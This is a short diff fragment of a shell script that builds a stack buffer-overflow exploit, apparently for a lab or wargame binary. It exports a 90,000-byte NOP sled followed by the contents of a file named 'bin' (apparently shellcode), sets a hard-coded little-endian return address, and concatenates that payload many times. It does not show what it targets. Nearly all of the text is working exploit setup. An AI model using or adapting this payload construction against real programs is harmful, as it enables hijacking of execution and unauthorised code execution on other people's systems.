@@ -2,7 +2,6 @@
 export LANG="`echo -ne '\x6e\x6c'`"
 export PAYLOAD="`python -c 'import sys; sys.stdout.write("\x90" * 90000)'``cat bin`"
 
-0xbfffff9f
 TARGET_EIP="\x9f\xff\xff\xbf"
 TOTAL_PAYLOAD="`cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin`"
 
